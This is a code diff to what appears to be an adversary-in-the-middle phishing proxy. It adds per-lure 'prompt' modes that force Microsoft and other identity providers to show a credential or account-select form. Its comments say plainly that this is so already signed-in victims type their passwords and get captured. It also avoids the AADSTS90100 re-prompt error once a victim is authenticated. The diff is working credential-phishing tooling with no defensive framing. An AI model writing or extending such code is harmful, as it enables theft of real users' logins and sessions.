@@ -808,6 +808,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if q := req.URL.RawQuery; q != "" && !strings.Contains(rurl, "?") {
 									rurl += "?" + q
 								}
+								// Pin the resolved prompt mode on the entry URL as well.
+								// Microsoft accepts prompt on the login entry point and
+								// forwards it to the authorize, so an entry that only
+								// appended ?login_hint (a redirect template) still gets the
+								// requested prompt - otherwise the mode would only apply
+								// once an authorize hop was reached, which that entry
+								// short-circuits.
+								if mode := p.cfg.LoginPromptFor(foundLure); mode != LOGIN_PROMPT_OFF {
+									if eu, err := url.Parse(rurl); err == nil && eu.Query().Get("prompt") == "" {
+										eq := eu.Query()
+										eq.Set("prompt", mode)
+										eu.RawQuery = eq.Encode()
+										rurl = eu.String()
+									}
+								}
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 								if resp != nil {
 									resp.Header.Add("Location", rurl)
@@ -1249,8 +1264,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						r_url.Host = r_host
 						changed = true
 					}
-					// force the provider to ask for credentials on OAuth/SAML hops
-					if p.forceLoginPrompt(r_url) {
+					// ask the provider to prompt on OAuth/SAML hops; the mode comes
+					// from the lure that started this visit, else the global setting.
+					//
+					// Only while the login is not yet authenticated: an authorize
+					// reached *after* the portal round-trip would otherwise force a
+					// second credential prompt, and Microsoft answers that with
+					// AADSTS90100 (re-prompt without an account identity).
+					var lure *Lure
+					authenticated := false
+					if s, ok := p.sessions[ps.SessionId]; ok {
+						lure = s.PhishLure
+						authenticated = s.Stage >= database.StageAuthenticated
+					}
+					if !authenticated && p.forceLoginPrompt(r_url, p.cfg.LoginPromptFor(lure)) {
 						changed = true
 					}
 					if changed {
@@ -2613,16 +2640,24 @@ func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
 	return u, false
 }
 
-// forceLoginPrompt makes the identity provider show its credential form instead
-// of silently signing the visitor back in with a session the browser already
-// holds. Without this, a victim who is already signed in land on the app and
-// never types a password, so no credentials get captured.
+// forceLoginPrompt makes the identity provider show a prompt instead of silently
+// signing the visitor back in with a session the browser already holds. Without
+// it, a victim who is already signed in lands on the app and never types a
+// password, so no credentials get captured.
 //
-// OAuth endpoints get prompt=login; the SAML / WS-Fed equivalents get wfresh=0.
-// Existing values are never overwritten, so an app that asks for
-// prompt=select_account keeps its own behaviour.
-func (p *HttpProxy) forceLoginPrompt(u *url.URL) bool {
-	if u == nil || !p.cfg.IsForceLoginEnabled() {
+// OAuth endpoints get prompt=<mode>; the SAML / WS-Fed equivalents get wfresh=0
+// because they have no select_account equivalent. Existing values are never
+// overwritten, so an app that asks for its own prompt keeps its behaviour.
+//
+// mode is off | login | select_account; off leaves the request untouched.
+func (p *HttpProxy) forceLoginPrompt(u *url.URL, mode string) bool {
+	if u == nil {
+		return false
+	}
+	if mode == "" {
+		mode = p.cfg.GetLoginPrompt()
+	}
+	if mode == LOGIN_PROMPT_OFF {
 		return false
 	}
 	pth := strings.ToLower(u.Path)
@@ -2634,7 +2669,7 @@ func (p *HttpProxy) forceLoginPrompt(u *url.URL) bool {
 		if q.Get("prompt") != "" {
 			return false
 		}
-		q.Set("prompt", "login")
+		q.Set("prompt", mode)
 	case strings.Contains(pth, "/saml2"),
 		strings.Contains(pth, "/wsfed"),
 		strings.Contains(pth, "/adfs/ls"):
